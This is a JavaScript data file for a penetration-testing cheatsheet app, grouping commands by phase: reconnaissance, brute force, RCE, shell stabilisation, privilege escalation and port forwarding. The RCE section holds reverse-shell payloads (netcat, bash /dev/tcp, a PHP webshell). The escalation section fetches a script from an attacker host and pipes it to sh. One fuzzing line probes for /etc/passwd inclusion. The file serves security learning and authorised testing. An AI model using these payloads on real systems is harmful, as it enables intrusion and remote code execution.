/**
 * Cheatsheet de pentesting por secciones y herramientas
 */
export const cheatsheetSections = [
  { id: 'reconocimiento', titleKey: 'cheatsheet_section_recon' },
  { id: 'exploitation', titleKey: 'cheatsheet_section_exploit' },
  { id: 'brute-force', titleKey: 'cheatsheet_section_brute_force' },
  { id: 'rce', titleKey: 'cheatsheet_section_rce' },
  { id: 'tratamiento-consola', titleKey: 'cheatsheet_section_consola' },
  { id: 'diccionarios', titleKey: 'cheatsheet_section_diccionarios' },
  { id: 'compartir-recursos', titleKey: 'cheatsheet_section_compartir' },
  { id: 'escalada', titleKey: 'cheatsheet_section_escalada' },
  { id: 'port-forwarding', titleKey: 'cheatsheet_section_portfw' },
  { id: 'crack-password', titleKey: 'cheatsheet_section_crack' },
];

export const cheatsheetTools = {
  // ========== RECONOCIMIENTO ==========
  nmap: {
    id: 'nmap',
    sectionId: 'reconocimiento',
    name: 'Nmap',
    descKey: 'cheatsheet_nmap_desc',
    categories: [
      {
        titleKey: 'cheatsheet_nmap_cat1_title',
        commands: [
          { descKey: 'cheatsheet_nmap_cat1_cmd1', cmd: 'nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn [ip]' },
          { descKey: 'cheatsheet_nmap_cat1_cmd2', cmd: 'nmap -sCV -p[port1,port2] [ip]' },
        ],
      },
      {
        titleKey: 'cheatsheet_nmap_cat2_title',
        params: [
          { param: '-sS', descKey: 'cheatsheet_nmap_param_sS' },
          { param: '-sT', descKey: 'cheatsheet_nmap_param_sT' },
          { param: '-sV', descKey: 'cheatsheet_nmap_param_sV' },
          { param: '-sC', descKey: 'cheatsheet_nmap_param_sC' },
          { param: '-O', descKey: 'cheatsheet_nmap_param_O' },
          { param: '-p-', descKey: 'cheatsheet_nmap_param_p' },
          { param: '-Pn', descKey: 'cheatsheet_nmap_param_Pn' },
          { param: '-n', descKey: 'cheatsheet_nmap_param_n' },
          { param: '--min-rate', descKey: 'cheatsheet_nmap_param_minrate' },
          { param: '--open', descKey: 'cheatsheet_nmap_param_open' },
          { param: '-T4 / -T2', descKey: 'cheatsheet_nmap_param_T' },
          { param: '-oA', descKey: 'cheatsheet_nmap_param_oA' },
        ],
      },
    ],
  },
  gobuster: {
    id: 'gobuster',
    sectionId: 'reconocimiento',
    name: 'Gobuster',
    descKey: 'cheatsheet_gobuster_desc',
    categories: [
      {
        titleKey: 'cheatsheet_gobuster_cat1_title',
        commands: [
          { descKey: 'cheatsheet_gobuster_cat1_cmd1', cmd: 'gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt' },
          { descKey: 'cheatsheet_gobuster_cat1_cmd2', cmd: 'gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt' },
        ],
      },
      {
        titleKey: 'cheatsheet_gobuster_cat2_title',
        commands: [
          { descKey: 'cheatsheet_gobuster_cat2_cmd1', cmd: 'gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt' },
          { descKey: 'cheatsheet_gobuster_cat2_cmd2', cmd: 'gobuster dns -d target.com -w wordlist.txt --resolver 8.8.8.8' },
        ],
      },
      {
        titleKey: 'cheatsheet_gobuster_cat3_title',
        params: [
          { param: '-q', descKey: 'cheatsheet_gobuster_param_q' },
          { param: '--status-codes-blacklist', descKey: 'cheatsheet_gobuster_param_blacklist' },
          { param: '-t', descKey: 'cheatsheet_gobuster_param_t' },
          { param: '--timeout', descKey: 'cheatsheet_gobuster_param_timeout' },
          { param: '-c', descKey: 'cheatsheet_gobuster_param_c' },
          { param: 'vhost', descKey: 'cheatsheet_gobuster_param_vhost' },
        ],
      },
    ],
  },
  'recon-red': {
    id: 'recon-red',
    sectionId: 'reconocimiento',
    nameKey: 'cheatsheet_recon_red',
    descKey: 'cheatsheet_recon_red_desc',
    categories: [
      {
        titleKey: 'cheatsheet_recon_red_title',
        commands: [
          { descKey: 'cheatsheet_recon_arp', cmd: 'arp-scan -I eth0 -localnet -ignoredups' },
          { descKey: 'cheatsheet_recon_ss', cmd: 'ss -tln' },
          { descKey: 'cheatsheet_recon_netstat', cmd: 'netstat -tnlp' },
          { descKey: 'cheatsheet_recon_wfuzz', cmd: 'wfuzz -c -hl=136 -t 200 -w [dic] -u [URL]/index.php?FUZZ=/etc/passwd' },
          { descKey: 'cheatsheet_recon_whatweb', cmd: 'whatweb [ip]' },
        ],
      },
    ],
  },

  // ========== EXPLOITATION ==========
  searchsploit: {
    id: 'searchsploit',
    sectionId: 'exploitation',
    name: 'Searchsploit',
    descKey: 'cheatsheet_searchsploit_desc',
    categories: [
      {
        titleKey: 'cheatsheet_searchsploit_title',
        commands: [
          { descKey: 'cheatsheet_searchsploit_search', cmd: 'searchsploit [name]' },
          { descKey: 'cheatsheet_searchsploit_x', cmd: 'searchsploit -x [path|name]' },
          { descKey: 'cheatsheet_searchsploit_m', cmd: 'searchsploit -m [path|name]' },
        ],
      },
    ],
  },

  // ========== BRUTE FORCE ==========
  hydra: {
    id: 'hydra',
    sectionId: 'brute-force',
    name: 'Hydra',
    descKey: 'cheatsheet_hydra_desc',
    categories: [
      {
        titleKey: 'cheatsheet_hydra_title',
        commands: [
          { descKey: 'cheatsheet_hydra_cmd1', cmd: 'hydra [protocol]://[host]:[port] -l [user] -P [wordlist]' },
        ],
      },
    ],
  },
  john: {
    id: 'john',
    sectionId: 'brute-force',
    name: 'John the Ripper',
    descKey: 'cheatsheet_john_desc',
    categories: [
      {
        titleKey: 'cheatsheet_john_title',
        commands: [
          { descKey: 'cheatsheet_john_crack', cmd: 'john -w:/usr/share/wordlists/rockyou.txt hash' },
          { descKey: 'cheatsheet_john_show', cmd: 'john --show hash' },
        ],
      },
    ],
  },

  // ========== RCE ==========
  rce: {
    id: 'rce',
    sectionId: 'rce',
    nameKey: 'cheatsheet_rce_name',
    descKey: 'cheatsheet_rce_desc',
    categories: [
      {
        titleKey: 'cheatsheet_rce_title',
        commands: [
          { descKey: 'cheatsheet_rce_nc_listen', cmd: 'nc -nlvp 443' },
          { descKey: 'cheatsheet_rce_nc_send', cmd: 'nc [host_ip] [host_port] -e /bin/bash' },
          { descKey: 'cheatsheet_rce_bash', cmd: 'bash -c "bash -i >& /dev/tcp/[host_ip]/[host_port] 0>&1"' },
          { descKey: 'cheatsheet_rce_php', cmd: '<?php system("bash -c \'bash -i >& /dev/tcp/[host_ip]/[host_port] 0>&1\'");?>' },
          { descKey: 'cheatsheet_rce_bash_encoded', cmd: 'bash -c "bash -i >%26 /dev/tcp/[host_ip]/[host_port] 0>%261" || echo [base64] | base64 -d' },
        ],
      },
    ],
  },

  // ========== TRATAMIENTO CONSOLA ==========
  consola: {
    id: 'consola',
    sectionId: 'tratamiento-consola',
    nameKey: 'cheatsheet_consola_name',
    descKey: 'cheatsheet_consola_desc',
    categories: [
      {
        titleKey: 'cheatsheet_consola_title',
        commands: [
          { descKey: 'cheatsheet_consola_script', cmd: 'script /dev/null -c bash' },
          { descKey: 'cheatsheet_consola_stty', cmd: 'stty raw -echo; fg' },
          { descKey: 'cheatsheet_consola_reset', cmd: 'reset xterm' },
          { descKey: 'cheatsheet_consola_stty_size', cmd: 'stty rows X columns Y' },
          { descKey: 'cheatsheet_consola_term', cmd: 'export TERM=xterm' },
          { descKey: 'cheatsheet_consola_shell', cmd: 'export SHELL=bash' },
        ],
      },
    ],
  },

  // ========== DICCIONARIOS ==========
  diccionarios: {
    id: 'diccionarios',
    sectionId: 'diccionarios',
    nameKey: 'cheatsheet_diccionarios_name',
    descKey: 'cheatsheet_diccionarios_desc',
    categories: [
      {
        titleKey: 'cheatsheet_diccionarios_title',
        commands: [
          { descKey: 'cheatsheet_dic_dir_medium', cmd: '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt' },
          { descKey: 'cheatsheet_dic_dir_big', cmd: '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt' },
          { descKey: 'cheatsheet_dic_subdomains', cmd: '/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt' },
        ],
      },
    ],
  },

  // ========== COMPARTIR RECURSOS ==========
  compartir: {
    id: 'compartir',
    sectionId: 'compartir-recursos',
    nameKey: 'cheatsheet_compartir_name',
    descKey: 'cheatsheet_compartir_desc',
    categories: [
      {
        titleKey: 'cheatsheet_compartir_title',
        commands: [
          { descKey: 'cheatsheet_compartir_scp', cmd: 'scp [filename] [username@ip:path]' },
        ],
      },
    ],
  },

  // ========== ESCALADA DE PRIVILEGIOS ==========
  escalada: {
    id: 'escalada',
    sectionId: 'escalada',
    nameKey: 'cheatsheet_escalada_name',
    descKey: 'cheatsheet_escalada_desc',
    categories: [
      {
        titleKey: 'cheatsheet_escalada_title',
        commands: [
          { descKey: 'cheatsheet_escalada_suid', cmd: 'find / -perm -4000 2>/dev/null' },
          { descKey: 'cheatsheet_escalada_cap', cmd: 'getcap -r / 2>/dev/null' },
          { descKey: 'cheatsheet_escalada_sudo', cmd: 'sudo -l' },
          { descKey: 'cheatsheet_escalada_nc_host', cmd: 'sudo nc -q 5 -lvnp 80 < linpeas.sh' },
          { descKey: 'cheatsheet_escalada_nc_victim', cmd: 'cat < /dev/tcp/10.10.10.10/80 | sh' },
        ],
      },
    ],
  },

  // ========== PORT FORWARDING ==========
  portfw: {
    id: 'portfw',
    sectionId: 'port-forwarding',
    nameKey: 'cheatsheet_portfw_name',
    descKey: 'cheatsheet_portfw_desc',
    categories: [
      {
        titleKey: 'cheatsheet_portfw_title',
        commands: [
          { descKey: 'cheatsheet_portfw_ssh', cmd: 'ssh -L [host_port]:[ip_local_victim:port_victim] [username@ip_victim]' },
          { descKey: 'cheatsheet_portfw_example', cmd: 'ssh -L 9999:localhost:8080 michael@sightless.htb' },
        ],
      },
    ],
  },
};
